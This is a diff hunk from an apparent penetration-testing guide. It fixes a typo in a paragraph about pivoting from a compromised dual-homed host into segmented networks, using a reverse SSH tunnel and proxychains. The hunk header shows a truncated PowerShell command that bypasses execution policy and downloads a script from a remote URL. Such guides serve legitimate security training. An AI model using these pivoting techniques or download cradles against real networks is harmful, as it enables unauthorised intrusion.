@@ -68,7 +68,7 @@ powershell -ep bypass -c "(New-Object System.Net.WebClient).DownloadString('http
 ***
 ***
 ### Additional Pivoting Option via Reverse SSH Tunnel
-In some cases, you will want to have a socket opened on the Compromised Dual-Homed Host for your tools, such as CrackMapExec, Evil-WinRM, SQLMap, etc., to tunnel through. Doing so allows your local tools to work with proxychains to reach and target otherwise unreachable hosts on segmented networks. To make this socket, we can use the SSH client on the compromised host SSH into our Kali machine and open a socket locally (on Kali) that we can pivot through.
+In some cases, you will want to have a socket opened on the Compromised Dual-Homed Host for your tools, such as CrackMapExec, Evil-WinRM, SQLMap, etc., to tunnel through. Doing so allows your local tools to work with proxychains to reach and target otherwise unreachable hosts on segmented networks. To make this socket, we can use the SSH client on the compromised host to SSH into our Kali machine and open a socket locally (on Kali) that we can pivot through.
 
 Before continuing, first ensure you have proxychains4 setup:
 ```zsh
